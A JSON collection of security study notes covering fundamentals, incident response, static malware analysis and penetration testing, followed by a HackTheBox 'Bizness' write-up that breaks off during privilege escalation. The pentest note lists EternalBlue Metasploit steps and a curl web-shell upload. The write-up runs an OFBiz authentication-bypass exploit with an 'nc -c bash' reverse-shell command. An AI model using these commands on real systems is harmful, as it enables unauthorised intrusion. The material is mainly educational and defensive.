[
  {
    "id": "cybersecurity-fundamentals",
    "slug": "cybersecurity-fundamentals",
    "title": "Cybersecurity Fundamentals",
    "content": "\n# Cybersecurity Fundamentals\n\n## Introduction\n\nCybersecurity is the practice of protecting systems, networks, and programs from digital attacks. These cyberattacks are usually aimed at accessing, changing, or destroying sensitive information; extorting money from users; or interrupting normal business processes.\n\nImplementing effective cybersecurity measures is particularly challenging today because there are more devices than people, and attackers are becoming more innovative.\n\n## The CIA Triad\n\nThe foundation of information security consists of three core principles known as the CIA Triad:\n\n### Confidentiality\nEnsuring that information is accessible only to those authorized to have access. This involves:\n- **Data encryption**: Protecting data both in transit and at rest\n- **Access controls**: Implementing proper authentication and authorization\n- **Authentication mechanisms**: Multi-factor authentication, biometrics\n- **Privacy protection**: Safeguarding personal and sensitive information\n\n### Integrity\nSafeguarding the accuracy and completeness of information and processing methods. Key aspects include:\n- **Data validation**: Ensuring data hasn't been tampered with\n- **Digital signatures**: Cryptographic proof of authenticity\n- **Version control**: Tracking changes and maintaining data history\n- **Change management**: Controlled processes for system modifications\n\n### Availability\nEnsuring that authorized users have access to information when required. This encompasses:\n- **System uptime**: Maintaining operational systems\n- **Disaster recovery**: Plans for system restoration after incidents\n- **Redundancy**: Backup systems and failover mechanisms\n- **Performance optimization**: Ensuring systems run efficiently\n\n## Common Threats\n\n### Malware\nMalicious software designed to damage or disrupt systems:\n\n- **Viruses**: Self-replicating programs that attach to other files\n  - Spread through infected files and email attachments\n  - Can corrupt or delete data\n  - Examples: Melissa, ILOVEYOU\n\n- **Worms**: Standalone malware that spreads across networks\n  - Self-propagating without user interaction\n  - Can consume network bandwidth\n  - Examples: Conficker, WannaCry\n\n- **Trojans**: Disguised malware that appears legitimate\n  - Often bundled with legitimate software\n  - Create backdoors for attackers\n  - Examples: Zeus, Emotet\n\n- **Ransomware**: Encrypts files and demands payment for decryption\n  - Growing threat to organizations\n  - Can cause significant business disruption\n  - Examples: CryptoLocker, Ryuk\n\n### Phishing\nFraudulent attempts to obtain sensitive information through:\n- **Email spoofing**: Impersonating legitimate organizations\n- **Fake websites**: Creating convincing replicas of real sites\n- **Social engineering tactics**: Psychological manipulation\n- **Credential harvesting**: Stealing usernames and passwords\n\n### Social Engineering\nPsychological manipulation techniques to divulge confidential information:\n- **Pretexting**: Creating false scenarios to gain trust\n- **Baiting**: Offering something enticing to trigger actions\n- **Quid pro quo**: Offering services in exchange for information\n- **Tailgating**: Following authorized personnel into secure areas\n\n## Security Controls\n\n### Preventive Controls\nControls designed to prevent security incidents:\n- **Firewalls**: Network traffic filtering and monitoring\n- **Antivirus software**: Malware detection and removal\n- **Access controls**: User authentication and authorization\n- **Security awareness training**: Educating users about threats\n\n### Detective Controls\nControls that identify security incidents:\n- **Intrusion detection systems (IDS)**: Network monitoring\n- **Log monitoring**: Analyzing system and application logs\n- **Security audits**: Regular security assessments\n- **Vulnerability assessments**: Identifying system weaknesses\n\n### Corrective Controls\nControls that respond to and recover from incidents:\n- **Incident response procedures**: Structured response plans\n- **Backup and recovery**: Data restoration capabilities\n- **Patch management**: Applying security updates\n- **System updates**: Maintaining current software versions\n\n## Best Practices\n\n### 1. Use Strong Authentication\n- **Complex passwords**: Long, unique passwords for each account\n- **Multi-factor authentication**: Additional verification layers\n- **Biometric verification**: Fingerprints, facial recognition\n- **Single sign-on (SSO)**: Centralized authentication management\n\n### 2. Keep Systems Updated\n- **Regular patching**: Apply security updates promptly\n- **Software updates**: Maintain current application versions\n- **Security configurations**: Implement hardening guidelines\n- **Vulnerability management**: Regular scanning and remediation\n\n### 3. Implement Defense in Depth\n- **Multiple security layers**: Overlapping security controls\n- **Network segmentation**: Isolating critical systems\n- **Endpoint protection**: Securing individual devices\n- **Data encryption**: Protecting sensitive information\n\n### 4. Regular Security Training\n- **Awareness programs**: Ongoing security education\n- **Phishing simulations**: Testing user awareness\n- **Security policies**: Clear guidelines and procedures\n- **Incident reporting**: Encouraging threat reporting\n\n## Risk Management\n\n### Risk Assessment Process\n1. **Asset Identification**: Catalog all organizational assets\n2. **Threat Identification**: Identify potential threats\n3. **Vulnerability Assessment**: Find system weaknesses\n4. **Risk Analysis**: Evaluate likelihood and impact\n5. **Risk Treatment**: Implement mitigation strategies\n\n### Risk Treatment Options\n- **Risk Avoidance**: Eliminating the risk entirely\n- **Risk Mitigation**: Reducing risk likelihood or impact\n- **Risk Transfer**: Shifting risk to third parties\n- **Risk Acceptance**: Acknowledging and accepting risk\n\n## Compliance and Frameworks\n\n### Common Frameworks\n- **NIST Cybersecurity Framework**: Comprehensive security guidance\n- **ISO 27001**: International security management standard\n- **CIS Controls**: Critical security controls implementation\n- **COBIT**: IT governance and management framework\n\n### Regulatory Requirements\n- **GDPR**: European data protection regulation\n- **HIPAA**: Healthcare information protection\n- **SOX**: Financial reporting requirements\n- **PCI DSS**: Payment card industry standards\n\n## Emerging Threats\n\n### Advanced Persistent Threats (APTs)\n- Long-term, stealthy attacks\n- Nation-state and organized crime groups\n- Multi-stage attack campaigns\n- Focus on high-value targets\n\n### Internet of Things (IoT) Security\n- Proliferation of connected devices\n- Weak default security configurations\n- Difficulty in patching and updating\n- Potential for large-scale botnets\n\n### Cloud Security Challenges\n- Shared responsibility models\n- Data sovereignty concerns\n- Configuration management\n- Identity and access management\n\n## Conclusion\n\nCybersecurity is an ongoing process that requires continuous learning, adaptation, and vigilance. By understanding fundamental principles and implementing comprehensive security measures, organizations can better protect themselves against evolving cyber threats.\n\nThe key to effective cybersecurity lies in:\n- Understanding the threat landscape\n- Implementing layered security controls\n- Maintaining current security practices\n- Fostering a security-aware culture\n- Continuously monitoring and improving security posture\n\nRemember: Security is not a destination but a journey that requires constant attention and improvement.\n\\`\\`\\`\n\n\\`\\`\\`\n",
    "tags": [
      "cybersecurity",
      "fundamentals",
      "security",
      "basics"
    ],
    "category": "Fundamentals",
    "type": "notes",
    "url": "/notes/cybersecurity-fundamentals"
  },
  {
    "id": "incident-response/playbook",
    "slug": "incident-response/playbook",
    "title": "Incident Response Playbook",
    "content": "\n# Incident Response Playbook\n\n## Preparation Phase\n\n### Team Structure and Roles\n\n#### Incident Commander\n- **Responsibilities**: Overall response coordination and decision-making\n- **Authority**: Resource allocation and external communication approval\n- **Skills Required**: Leadership, communication, technical understanding\n- **Contact Information**: 24/7 availability with multiple contact methods\n\n#### Security Analyst\n- **Responsibilities**: Technical investigation and analysis\n- **Tasks**: Log analysis, forensic examination, threat assessment\n- **Tools**: SIEM, forensic software, analysis platforms\n- **Expertise**: Malware analysis, network forensics, system administration\n\n#### Communications Lead\n- **Responsibilities**: Internal and external communications\n- **Stakeholders**: Management, legal, customers, media, regulators\n- **Templates**: Pre-approved communication templates\n- **Channels**: Multiple communication methods and backup systems\n\n#### Legal Counsel\n- **Responsibilities**: Legal and regulatory compliance\n- **Areas**: Data breach laws, evidence handling, regulatory requirements\n- **Contacts**: External legal firms, regulatory bodies\n- **Documentation**: Legal hold procedures, compliance checklists\n\n### Tools and Resources\n\n#### Incident Response Toolkit\n- **Forensic Imaging**: dd, FTK Imager, EnCase\n- **Memory Analysis**: Volatility, Rekall, WinPmem\n- **Network Analysis**: Wireshark, tcpdump, NetworkMiner\n- **Malware Analysis**: IDA Pro, Ghidra, Cuckoo Sandbox\n\n#### Communication Systems\n- **Primary**: Secure messaging platform (Signal, Element)\n- **Secondary**: Conference bridge with dial-in numbers\n- **Emergency**: Satellite phones for critical situations\n- **Documentation**: Shared workspace for real-time collaboration\n\n## Detection and Analysis\n\n### Initial Detection Sources\n\n#### Security Monitoring\n- **SIEM Alerts**: Correlation rules and anomaly detection\n- **IDS/IPS**: Network intrusion detection systems\n- **EDR**: Endpoint detection and response platforms\n- **Log Analysis**: Centralized logging and analysis\n\n#### User Reports\n- **Phishing Reports**: Suspicious email notifications\n- **System Issues**: Performance problems or unusual behavior\n- **Data Concerns**: Unauthorized access or data exposure\n- **Social Engineering**: Suspicious phone calls or requests\n\n### Triage Process\n\n#### Initial Assessment (15 minutes)\n1. **Verify the Incident**: Confirm legitimate security event\n2. **Classify Severity**: Use predefined severity matrix\n3. **Assign Resources**: Allocate appropriate team members\n4. **Establish Timeline**: Set initial response milestones\n\n#### Severity Classification\n- **Critical**: System compromise, data breach, service outage\n- **High**: Attempted breach, malware infection, policy violation\n- **Medium**: Suspicious activity, minor security event\n- **Low**: False positive, informational alert\n\n### Evidence Collection\n\n#### Digital Forensics\n\\`\\`\\`bash\n# Create forensic image\ndd if=/dev/sda of=/mnt/evidence/disk_image.dd bs=4096 conv=noerror,sync\n\n# Calculate hash for integrity\nsha256sum /mnt/evidence/disk_image.dd > /mnt/evidence/disk_image.sha256\n\n# Memory dump acquisition\nsudo ./linpmem-2.1.post4 /mnt/evidence/memory.aff4\n\n# Network packet capture\ntcpdump -i eth0 -w /mnt/evidence/network_capture.pcap\n\\`\\`\\`\n\n#### Chain of Custody\n- **Documentation**: Detailed evidence handling log\n- **Storage**: Secure, tamper-evident storage\n- **Access Control**: Limited access with audit trail\n- **Transportation**: Secure transfer procedures\n\n## Containment, Eradication, and Recovery\n\n### Short-term Containment\n\n#### Network Isolation\n- **System Quarantine**: Isolate affected systems from network\n- **Network Segmentation**: Implement additional network controls\n- **Access Restriction**: Disable compromised accounts\n- **Traffic Blocking**: Block malicious IP addresses and domains\n\n#### Evidence Preservation\n\\`\\`\\`bash\n# Create system snapshot\nvirsh snapshot-create-as vm_name snapshot_name\n\n# Preserve volatile data\nps aux > /evidence/running_processes.txt\nnetstat -tulpn > /evidence/network_connections.txt\nlsof > /evidence/open_files.txt\n\\`\\`\\`\n\n### Long-term Containment\n\n#### System Hardening\n- **Patch Management**: Apply security updates\n- **Configuration Changes**: Implement security configurations\n- **Access Controls**: Strengthen authentication and authorization\n- **Monitoring Enhancement**: Increase logging and monitoring\n\n#### Threat Intelligence\n- **IOC Analysis**: Indicators of compromise research\n- **Attribution**: Threat actor identification\n- **TTPs**: Tactics, techniques, and procedures analysis\n- **Threat Landscape**: Current threat environment assessment\n\n### Eradication\n\n#### Malware Removal\n\\`\\`\\`bash\n# Scan for malware\nclamscan -r --infected --remove /\n\n# Remove persistence mechanisms\ncrontab -l | grep -v malicious_script | crontab -\nsystemctl disable malicious_service\n\\`\\`\\`\n\n#### Vulnerability Remediation\n- **Patch Installation**: Apply security patches\n- **Configuration Fixes**: Correct misconfigurations\n- **Access Revocation**: Remove unauthorized access\n- **System Rebuilding**: Complete system reconstruction if necessary\n\n### Recovery\n\n#### System Restoration\n- **Clean Backups**: Restore from verified clean backups\n- **System Validation**: Verify system integrity and functionality\n- **Gradual Restoration**: Phased return to normal operations\n- **Monitoring**: Enhanced monitoring during recovery phase\n\n#### Business Continuity\n- **Service Restoration**: Prioritize critical business functions\n- **User Communication**: Inform users of service status\n- **Performance Monitoring**: Ensure system performance\n- **Backup Verification**: Confirm backup system functionality\n\n## Communication and Documentation\n\n### Internal Communication\n\n#### Stakeholder Notifications\n- **Management**: Executive briefings and status updates\n- **IT Teams**: Technical coordination and resource allocation\n- **Business Units**: Impact assessment and recovery planning\n- **Legal/Compliance**: Regulatory and legal implications\n\n#### Communication Templates\n\\`\\`\\`\nINCIDENT NOTIFICATION\nIncident ID: INC-2024-001\nSeverity: HIGH\nStatus: ACTIVE\nSummary: Suspected malware infection on critical server\nImpact: Email services degraded\nActions: Containment in progress, investigation ongoing\nNext Update: 2 hours\nContact: incident-commander@company.com\n\\`\\`\\`\n\n### External Communication\n\n#### Regulatory Reporting\n- **Timeline Requirements**: Notification deadlines\n- **Required Information**: Specific data elements\n- **Submission Methods**: Approved reporting channels\n- **Follow-up Requirements**: Additional reporting obligations\n\n#### Customer Notification\n- **Breach Notification**: Data breach disclosure requirements\n- **Service Impact**: Service availability and performance\n- **Remediation Steps**: Actions taken to address incident\n- **Prevention Measures**: Steps to prevent recurrence\n\n## Post-Incident Activities\n\n### Lessons Learned\n\n#### After-Action Review\n- **Timeline Analysis**: Detailed incident timeline\n- **Response Effectiveness**: What worked well\n- **Improvement Areas**: What could be improved\n- **Resource Adequacy**: Staffing and tool effectiveness\n\n#### Process Improvements\n- **Playbook Updates**: Revise procedures based on experience\n- **Tool Enhancements**: Improve detection and response capabilities\n- **Training Needs**: Identify skill gaps and training requirements\n- **Communication Improvements**: Enhance notification procedures\n\n### Metrics and KPIs\n\n#### Response Metrics\n- **Mean Time to Detection (MTTD)**: Average time to identify incidents\n- **Mean Time to Response (MTTR)**: Average time to begin response\n- **Mean Time to Recovery (MTTR)**: Average time to restore services\n- **False Positive Rate**: Percentage of false alarms\n\n#### Effectiveness Metrics\n- **Containment Success**: Percentage of successful containments\n- **Recovery Time**: Time to full operational recovery\n- **Cost Impact**: Financial impact of incidents\n- **Stakeholder Satisfaction**: Internal and external satisfaction ratings\n\n## Legal and Regulatory Considerations\n\n### Data Breach Laws\n- **GDPR**: European Union data protection regulation\n- **CCPA**: California Consumer Privacy Act\n- **HIPAA**: Health Insurance Portability and Accountability Act\n- **SOX**: Sarbanes-Oxley Act requirements\n\n### Evidence Handling\n- **Chain of Custody**: Proper evidence documentation\n- **Legal Hold**: Preservation of relevant documents\n- **Expert Testimony**: Preparation for legal proceedings\n- **Disclosure Requirements**: Legal and regulatory disclosure obligations\n\n## Conclusion\n\nEffective incident response requires preparation, coordination, and continuous improvement. This playbook provides a framework for responding to security incidents while ensuring legal compliance and business continuity.\n",
    "tags": [
      "incident-response",
      "playbook",
      "containment",
      "forensics"
    ],
    "category": "Incident Response",
    "type": "notes",
    "url": "/notes/incident-response/playbook"
  },
  {
    "id": "malware-analysis/static-analysis",
    "slug": "malware-analysis/static-analysis",
    "title": "Static Malware Analysis Techniques",
    "content": "\n# Static Malware Analysis Techniques\n\n## Introduction\n\nStatic malware analysis involves examining malicious software without executing it. This approach allows analysts to understand the malware's structure, functionality, and potential impact while maintaining a safe analysis environment.\n\n## Preparation and Safety\n\n### Analysis Environment\n- **Isolated Network**: Completely isolated from production networks\n- **Virtual Machines**: Disposable analysis environments\n- **Snapshots**: Regular VM snapshots for quick recovery\n- **Air-Gapped Systems**: Physical isolation for highly dangerous samples\n\n### Safety Protocols\n- **Never Execute**: Static analysis means no execution\n- **Hash Verification**: Verify sample integrity with cryptographic hashes\n- **Documentation**: Maintain detailed analysis logs\n- **Chain of Custody**: Proper evidence handling procedures\n\n## File Format Analysis\n\n### Portable Executable (PE) Analysis\n- **PE Headers**: Examine DOS, NT, and optional headers\n- **Section Analysis**: Code, data, and resource sections\n- **Import/Export Tables**: API dependencies and exposed functions\n- **Digital Signatures**: Certificate validation and trust chains\n\n### Other File Formats\n- **ELF Files**: Linux executable analysis\n- **Mach-O**: macOS binary examination\n- **Office Documents**: Macro and embedded object analysis\n- **PDF Files**: JavaScript and embedded content analysis\n\n## String Analysis\n\n### Extracting Strings\n\\`\\`\\`bash\n# Basic string extraction\nstrings malware.exe > strings.txt\n\n# Unicode strings\nstrings -e l malware.exe > unicode_strings.txt\n\n# Minimum length filtering\nstrings -n 8 malware.exe > long_strings.txt\n\\`\\`\\`\n\n### String Categories\n- **URLs and Domains**: Network indicators\n- **File Paths**: Target locations and dependencies\n- **Registry Keys**: System modification indicators\n- **Error Messages**: Functionality clues\n- **Encryption Keys**: Cryptographic artifacts\n\n## Disassembly and Code Analysis\n\n### Disassemblers\n- **IDA Pro**: Industry standard disassembler\n- **Ghidra**: NSA's open-source reverse engineering tool\n- **Radare2**: Command-line reverse engineering framework\n- **x64dbg**: Windows debugging and disassembly\n\n### Assembly Analysis Techniques\n- **Control Flow**: Function calls and program flow\n- **Data Flow**: Variable usage and manipulation\n- **API Calls**: System interaction points\n- **Obfuscation Detection**: Packed or encrypted code identification\n\n## Cryptographic Analysis\n\n### Encryption Detection\n- **Entropy Analysis**: High entropy indicates encryption/compression\n- **Cryptographic Constants**: Known algorithm signatures\n- **Key Scheduling**: Encryption key generation patterns\n- **Cipher Identification**: Algorithm fingerprinting\n\n### Hash Analysis\n\\`\\`\\`bash\n# File hashes\nmd5sum malware.exe\nsha1sum malware.exe\nsha256sum malware.exe\n\n# Import hash (ImpHash)\npython imphash.py malware.exe\n\n# Fuzzy hashing\nssdeep malware.exe\n\\`\\`\\`\n\n## Metadata Extraction\n\n### File Properties\n- **Compilation Timestamp**: When the malware was built\n- **Compiler Information**: Development environment details\n- **Version Information**: Embedded version strings\n- **Digital Certificates**: Code signing information\n\n### EXIF and Embedded Data\n- **Author Information**: Creator metadata\n- **Creation Tools**: Software used for creation\n- **Embedded Resources**: Icons, strings, and data\n- **Hidden Streams**: Alternate data streams (ADS)\n\n## Network Indicators\n\n### Static Network Analysis\n- **Hardcoded IPs**: Command and control servers\n- **Domain Names**: Communication endpoints\n- **URL Patterns**: Web-based communication\n- **Protocol Analysis**: Network communication methods\n\n### Configuration Extraction\n- **C2 Servers**: Command and control infrastructure\n- **Encryption Keys**: Communication encryption\n- **User Agents**: HTTP header information\n- **Port Numbers**: Network service ports\n\n## Behavioral Indicators\n\n### File System Operations\n- **File Creation**: New files and locations\n- **File Modification**: Target file changes\n- **Directory Operations**: Folder creation and deletion\n- **Hidden Files**: Concealment techniques\n\n### Registry Operations\n- **Persistence Mechanisms**: Startup and service entries\n- **Configuration Storage**: Settings and parameters\n- **System Modifications**: Security and policy changes\n- **Forensic Artifacts**: Analysis traces\n\n## Obfuscation and Packing\n\n### Packing Detection\n\\`\\`\\`bash\n# Entropy calculation\npython entropy.py malware.exe\n\n# Packer identification\npeid malware.exe\ndetect-it-easy malware.exe\n\n# Section analysis\nobjdump -h malware.exe\n\\`\\`\\`\n\n### Common Obfuscation Techniques\n- **String Encryption**: Encrypted string literals\n- **Control Flow Obfuscation**: Complex branching patterns\n- **Dead Code Insertion**: Meaningless code additions\n- **API Hashing**: Dynamic API resolution\n\n## Documentation and Reporting\n\n### Analysis Documentation\n- **Executive Summary**: High-level findings\n- **Technical Details**: Detailed analysis results\n- **Indicators of Compromise**: IOCs for detection\n- **Mitigation Recommendations**: Response actions\n\n### IOC Generation\n\\`\\`\\`yaml\n# YARA Rule Example\nrule Malware_Family_Detection {\n    meta:\n        description = \"Detects specific malware family\"\n        author = \"Security Analyst\"\n        date = \"2024-01-30\"\n    \n    strings:\n        $string1 = \"unique_string_pattern\"\n        $string2 = { 48 89 E5 48 83 EC 20 }\n    \n    condition:\n        $string1 or $string2\n}\n\\`\\`\\`\n\n## Tools and Resources\n\n### Essential Tools\n- **Hex Editors**: HxD, 010 Editor\n- **Disassemblers**: IDA Pro, Ghidra, Radare2\n- **PE Analyzers**: PEiD, CFF Explorer, PE-bear\n- **String Extractors**: Strings, FLOSS\n- **Hash Calculators**: HashCalc, md5deep\n\n### Online Resources\n- **VirusTotal**: Multi-engine malware scanning\n- **Hybrid Analysis**: Automated analysis platform\n- **Any.run**: Interactive malware analysis\n- **Joe Sandbox**: Comprehensive analysis reports\n\n## Best Practices\n\n### Analysis Workflow\n1. **Initial Triage**: Basic file information and hashes\n2. **String Analysis**: Extract and categorize strings\n3. **Structural Analysis**: PE headers and sections\n4. **Disassembly**: Code analysis and function identification\n5. **IOC Extraction**: Generate detection signatures\n6. **Documentation**: Comprehensive analysis report\n\n### Quality Assurance\n- **Peer Review**: Second analyst verification\n- **Tool Validation**: Cross-reference with multiple tools\n- **False Positive Testing**: Validate IOCs against clean files\n- **Continuous Learning**: Stay updated with new techniques\n\n## Conclusion\n\nStatic malware analysis is a critical skill for cybersecurity professionals. By systematically examining malware without execution, analysts can safely understand threats, generate detection signatures, and develop effective countermeasures while minimizing risk to analysis infrastructure.\n",
    "tags": [
      "malware",
      "static-analysis",
      "reverse-engineering",
      "security"
    ],
    "category": "Malware Analysis",
    "type": "notes",
    "url": "/notes/malware-analysis/static-analysis"
  },
  {
    "id": "penetration-testing/methodology",
    "slug": "penetration-testing/methodology",
    "title": "Penetration Testing Methodology",
    "content": "\n# Penetration Testing Methodology\n\n## Overview\n\nPenetration testing is a systematic approach to evaluating the security of an IT infrastructure by safely attempting to exploit vulnerabilities. This methodology follows industry standards and best practices.\n\n## Testing Phases\n\n### 1. Planning and Reconnaissance\n\n#### Scope Definition\n- **Target Systems**: Define which systems, networks, and applications are in scope\n- **Testing Methods**: Determine black box, white box, or gray box approach\n- **Rules of Engagement**: Establish testing boundaries and restrictions\n- **Timeline**: Set testing schedule and milestones\n\n#### Information Gathering (OSINT)\n- **Passive Reconnaissance**: Gather information without direct interaction\n  - DNS enumeration\n  - WHOIS lookups\n  - Social media research\n  - Public records search\n- **Active Reconnaissance**: Direct interaction with target systems\n  - Port scanning\n  - Service enumeration\n  - Banner grabbing\n  - Network mapping\n\n### 2. Scanning and Enumeration\n\n#### Network Discovery\n\\`\\`\\`bash\n# Network sweep\nnmap -sn 192.168.1.0/24\n\n# Port scanning\nnmap -sS -sV -O target.com\n\n# Service enumeration\nnmap -sC -sV -p- target.com\n\n# UDP scanning\nnmap -sU --top-ports 1000 target.com\n\\`\\`\\`\n\n#### Vulnerability Scanning\n- **Automated Tools**: Nessus, OpenVAS, Qualys\n- **Manual Testing**: Custom scripts and techniques\n- **Web Application Scanning**: Burp Suite, OWASP ZAP\n- **Database Scanning**: SQLMap, NoSQLMap\n\n### 3. Gaining Access\n\n#### Exploitation Techniques\n- **Network Exploits**: Buffer overflows, protocol vulnerabilities\n- **Web Application Exploits**: SQL injection, XSS, CSRF\n- **Social Engineering**: Phishing, pretexting, physical access\n- **Password Attacks**: Brute force, dictionary attacks, credential stuffing\n\n#### Common Exploitation Tools\n\\`\\`\\`bash\n# Metasploit Framework\nmsfconsole\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS target_ip\nexploit\n\n# SQL Injection with SQLMap\nsqlmap -u \"http://target.com/page.php?id=1\" --dbs\n\n# Web shell upload\ncurl -X POST -F \"file=@shell.php\" http://target.com/upload.php\n\\`\\`\\`\n\n### 4. Maintaining Access\n\n#### Persistence Mechanisms\n- **Backdoors**: Hidden access points for future entry\n- **Rootkits**: Stealth tools to maintain system access\n- **Scheduled Tasks**: Automated execution of malicious code\n- **Registry Modifications**: Windows persistence techniques\n\n#### Privilege Escalation\n- **Local Privilege Escalation**: Exploit local vulnerabilities\n- **Domain Privilege Escalation**: Active Directory attacks\n- **Kernel Exploits**: Operating system vulnerabilities\n- **Misconfiguration Abuse**: Weak permissions and settings\n\n### 5. Analysis and Reporting\n\n#### Evidence Collection\n- **Screenshots**: Visual proof of successful exploitation\n- **Log Files**: System and application logs\n- **Network Captures**: Packet analysis and traffic flows\n- **Command Output**: Results of executed commands\n\n#### Risk Assessment\n- **CVSS Scoring**: Common Vulnerability Scoring System\n- **Business Impact**: Potential damage to organization\n- **Exploitability**: Ease of exploitation\n- **Remediation Effort**: Cost and complexity of fixes\n\n## OWASP Top 10 Testing\n\n### 1. Injection Flaws\n- **SQL Injection**: Database query manipulation\n- **NoSQL Injection**: NoSQL database attacks\n- **LDAP Injection**: Directory service attacks\n- **Command Injection**: Operating system command execution\n\n### 2. Broken Authentication\n- **Session Management**: Session fixation, hijacking\n- **Password Security**: Weak passwords, storage issues\n- **Multi-factor Authentication**: Bypass techniques\n- **Account Lockout**: Brute force protection testing\n\n### 3. Sensitive Data Exposure\n- **Data in Transit**: Unencrypted communications\n- **Data at Rest**: Unencrypted storage\n- **Backup Security**: Unsecured backup files\n- **Log Security**: Sensitive information in logs\n\n## Tools and Frameworks\n\n### Network Testing\n- **Nmap**: Network discovery and port scanning\n- **Masscan**: High-speed port scanner\n- **Zmap**: Internet-wide network scanner\n- **Unicornscan**: Asynchronous network scanner\n\n### Web Application Testing\n- **Burp Suite**: Comprehensive web application testing\n- **OWASP ZAP**: Open-source web application scanner\n- **Nikto**: Web server scanner\n- **Dirb/Dirbuster**: Directory and file brute forcing\n\n### Exploitation Frameworks\n- **Metasploit**: Comprehensive penetration testing framework\n- **Cobalt Strike**: Advanced threat emulation platform\n- **Empire**: PowerShell post-exploitation framework\n- **BeEF**: Browser exploitation framework\n\n### Post-Exploitation\n- **Mimikatz**: Windows credential extraction\n- **BloodHound**: Active Directory attack path analysis\n- **PowerSploit**: PowerShell post-exploitation toolkit\n- **LinEnum**: Linux enumeration script\n\n## Reporting Best Practices\n\n### Executive Summary\n- **High-level Overview**: Non-technical summary for management\n- **Risk Rating**: Overall security posture assessment\n- **Key Findings**: Most critical vulnerabilities\n- **Business Impact**: Potential consequences of exploitation\n\n### Technical Details\n- **Vulnerability Descriptions**: Detailed technical explanations\n- **Proof of Concept**: Step-by-step exploitation procedures\n- **Evidence**: Screenshots, logs, and command output\n- **CVSS Scores**: Standardized vulnerability ratings\n\n### Remediation Recommendations\n- **Immediate Actions**: Critical fixes requiring urgent attention\n- **Short-term Solutions**: Fixes to implement within 30 days\n- **Long-term Improvements**: Strategic security enhancements\n- **Compensating Controls**: Temporary risk mitigation measures\n\n## Conclusion\n\nEffective penetration testing requires a systematic approach, proper tooling, and comprehensive reporting. Regular testing helps organizations identify and address security weaknesses before they can be exploited by malicious actors.\n",
    "tags": [
      "pentest",
      "methodology",
      "security-testing",
      "vulnerability"
    ],
    "category": "Penetration Testing",
    "type": "notes",
    "url": "/notes/penetration-testing/methodology"
  },
  {
    "id": "https://medium.com/p/72c87fed37b2",
    "slug": "https://medium.com/p/72c87fed37b2",
    "title": "HackTheBox — Bizness",
    "content": "\n<h3>HackTheBox — Bizness</h3>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/720/1*ruqyxFAV3JEWq4A7qxxZHw.png\"><figcaption>Hack The Box — Bizness</figcaption></figure><p>Today, I will be tackling the challenge from Hack The Box with the machine code “Bizness”,this machine is Linux-based.</p>\n<h4><strong>Enumeration</strong></h4>\n<p>In the first step, we need to conduct information gathering first to check the open ports and identify the services running on the server. Here, I use the Nmap tool for information gathering.</p>\n<pre>nmap -sCV --script vulns -Pn -oA biness &lt;IP&gt;</pre>\n<p>Here is information about the server that we obtained through enumeration using Nmap :</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/634/1*QfkxVewvJDRy1NMC2C7WQA.png\"><figcaption>Nmap Result</figcaption></figure><p>There are three running services observed, including:</p>\n<ul>\n<li>Port 22 -&gt; OpenSSH</li>\n<li>Port 80 -&gt; Http -&gt; Nginx 1.18.0</li>\n<li>Port 443 -&gt; ssl/http -&gt; Nginx 1.18.0</li>\n</ul>\n<p>Now, I am trying to add a host entry for the IP using the URL “bizness.htb” in the /etc/hosts file.</p>\n<p>Next, here I attempt to open the page and gather information for further exploitation. When the website is opened, a landing page will appear as shown in the following image:</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/631/1*Nf2eiQ3YkGA0ujNQf1xsFQ.png\"><figcaption>Web page</figcaption></figure><p>After further investigation, it seems that there is nothing I can use as an entry point. However, I am trying again to perform Directory Enumeration using Dirsearch.</p>\n<pre>dirsearch -u &lt;ip&gt;</pre>\n<p>Here are the results of the Directory Enumeration:</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/631/1*coBt2GC4CxapBVbpWP1AjQ.png\"><figcaption>Dirsearch Result</figcaption></figure><p>Here, we successfully obtained the login page at the endpoint (<a href=\"https://bizness.htb/control/login\">https://bizness.htb/control/login</a>), which is the default login page of Apache Ofbiz.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/639/1*nGjYaXqpVn0aBsfRrO-T8A.png\"><figcaption>Apache OfBiz login page</figcaption></figure><h4>Vulnerability Analysis</h4>\n<p>At this stage, I am attempting to search for public exploit information or CVE related to Apache Ofbiz. When searching for a public exploit for Apache Ofbiz, I came across a documented vulnerability with CVE-2023–51467.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/638/1*zYLU81IDF-ppwknOxPgWiA.png\"><figcaption>CVE Details</figcaption></figure><p>Next, I am searching for exploits related to CVE to analyze whether this used Apache Orbiz is vulnerable to that specific vulnerability.</p>\n<h4>Exploitation</h4>\n<p>Here, I successfully obtained an exploit for performing authentication bypass, which can be found in the following repository : <a href=\"https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass.git\">Click here</a></p>\n<p>It appears that the utilized Apache OFBiz is still vulnerable.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/598/1*nWDu8fm0B6eDoHfCwwW36w.png\"><figcaption>Vulnerable target</figcaption></figure><p>In the next step, I will attempt to obtain a reverse shell on the server using the following command.</p>\n<pre>python3 exploit.py --url https://bizness.htb/ --cmd 'nc -c bash &lt;IP&gt; &lt;PORT&gt;'</pre>\n<p>Please set up the listener using netcat beforehand.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/630/1*J8BY8wzncLHGhyRA6t9Giw.png\"><figcaption>Netcat listener</figcaption></figure><p>Then input the aforementioned exploit command to successfully obtain a Reverse Shell.</p>\n<p>As seen in the image below, I have successfully acquired a shell.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/594/1*q17WvjpCZG1i6aREWOPgfA.png\"><figcaption>Generated Payload</figcaption></figure><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/639/1*DeVG7HtGeZ8rkDmH4EnA0Q.png\"><figcaption>Got reverse shell</figcaption></figure><p>The next step is to search for the flag for the local user.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/635/1*-tB-3YZS7DwlJiBexhICIg.png\"><figcaption>Local flag</figcaption></figure><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/360/1*TkyHSsLD4hZPHYaTQR8BLw.png\"><figcaption>Local flag 2</figcaption></figure><p>The next objective is to find the root user flag by performing Privilege Escalation.</p>\n<h4>Privilage Escalation</h4>\n<p>At this stage, I need to delve deeper into 